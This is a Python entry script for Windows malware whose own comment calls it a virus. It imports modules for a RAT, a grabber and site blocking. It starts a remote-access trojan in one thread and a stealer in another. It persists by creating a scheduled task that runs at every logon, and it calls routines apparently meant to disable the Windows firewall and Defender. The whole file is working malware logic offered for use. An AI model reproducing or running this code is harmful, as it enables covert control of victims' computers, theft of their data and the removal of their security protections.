# import virus
from setting import *
from admin import *
from block_sites import *
from rat import *
from grabber import *
import threading
from startup import *
from turnoff import *

# import rat
import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys

block_sites()
def stealer():
    command = "call" + stealerpath
    command = f'SchTasks /create /f /sc Onlogon /tn "mainv5" /tr "{destination}"'
    os.system(command)
def code1():
    rat()

def code2():
    print("no")
def code3():
    threading.Thread(target=stealer).start()
    Security.FireWall()
    Security.Defender()

# Tạo các thread cho từng đoạn mã
thread1 = threading.Thread(target=code1)
thread2 = threading.Thread(target=code2)
thread3 = threading.Thread(target=code3)

# Khởi động các thread
thread1.start()
thread2.start()
thread3.start()

# Chờ cho tất cả các thread hoàn thành
thread1.join()
thread2.join()
thread3.join()
